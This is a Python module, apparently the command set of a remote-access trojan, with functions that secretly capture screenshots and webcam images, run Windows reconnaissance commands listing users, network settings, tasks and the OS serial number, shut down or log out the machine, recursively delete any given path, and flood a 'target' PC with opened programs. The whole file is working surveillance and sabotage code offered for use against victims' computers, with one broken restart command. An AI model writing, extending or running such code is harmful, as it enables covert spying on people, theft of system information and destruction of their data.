# Ready_commands.py
import subprocess
import time
from io import BytesIO
import cv2
import pyautogui
import os
import shutil


def take_screenshot() -> bytes:
    screenshot = pyautogui.screenshot()
    img_byte_arr = BytesIO()
    screenshot.save(img_byte_arr, format='PNG')
    return img_byte_arr.getvalue()


def camera_picture() -> bytes:
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    cap.release()
    if not ret:
        raise RuntimeError("Failed to capture image from camera")

    success, encoded_img = cv2.imencode(".png", frame)
    if not success:
        raise RuntimeError("Failed to encode image")
    return encoded_img.tobytes()


def get_basic_information() -> bytes:
    list_of_commands = [
        "dir",
        "tasklist",
        "net user",
        "netstat /a",
        "ipconfig /all",
        "systeminfo",
        "arp -a",
        "route print",
        "driverquery",
        "sc query state= all",
        "net share",
        "schtasks /query /fo LIST /v",
        "wmic cpu get name,numberofcores,currentclockspeed",
        "wmic os get caption,version,osarchitecture,serialnumber",
        "qwinsta"
    ]
    result = []
    for i in list_of_commands:
        try:
            print(f"Running Command: {i}")
            run = subprocess.run(i, shell=True, text=True, capture_output=True)
            output = run.stdout if run.stdout else run.stderr
            result.append(f"\n--- {i} ---\n  {output}...")
        except Exception as e:
            result.append(f"\n--- {i} ---\n Error: {str(e)}...")

    final_result = "\n".join(result)
    return final_result.encode("utf-8")


def shutdown() -> bytes:
    command = "shutdown /s /t 0"
    try:
        run = subprocess.run(command, shell=True, text=True, capture_output=True)

        if run.returncode == 0:
            msg = "Shutdown command executed successfully."
        else:
            msg = f"Failed to execute shutdown. Error: {run.stderr}"

    except Exception as e:
        msg = f"Exception: {str(e)}"

    return msg.encode("utf-8")


def restart() -> bytes:
    command = "restart /r /t 0"
    try:
        run = subprocess.run(command, shell=True, text=True, capture_output=True)

        if run.returncode == 0:
            msg = "Restart command executed successfully."
        else:
            msg = f"Failed to execute Restart. Error: {run.stderr}"

    except Exception as e:
        msg = f"Exception: {str(e)}"

    return msg.encode("utf-8")


def logout() -> bytes:
    command = "shutdown /l /t 0"
    try:
        run = subprocess.run(command, shell=True, text=True, capture_output=True)

        if run.returncode == 0:
            msg = "Logout command executed successfully."
        else:
            msg = f"Failed to execute Logout. Error: {run.stderr}"

    except Exception as e:
        msg = f"Exception: {str(e)}"

    return msg.encode("utf-8")


def delete_files(path: str) -> bytes:
    try:
        shutil.rmtree(path)
        if os.path.exists(path):
            msg = f"Failed to delete: {path}"
        else:
            msg = f"Successfully deleted: {path}"

    except Exception as e:
        msg = f"Error: {str(e)}"

    return msg.encode("utf-8")


def Crash_Target_PC() -> bytes:
    apps = [
        "calc.exe", "notepad.exe", "mspaint.exe", "write.exe",
        "explorer.exe", "cmd.exe", "powershell.exe",
        "snippingtool.exe", "magnify.exe", "osk.exe", "winver.exe",
        "control.exe", "eventvwr.exe", "mspaint.exe"
    ]
    opened = []
    for app in apps:
        try:
            subprocess.Popen(app)
            opened.append(app)
        except Exception as e:
            return f"Failed to open {app}: {str(e)}".encode()
        time.sleep(0.5)
    return f"Opened apps: {', '.join(opened)}".encode()

# you can add other functions here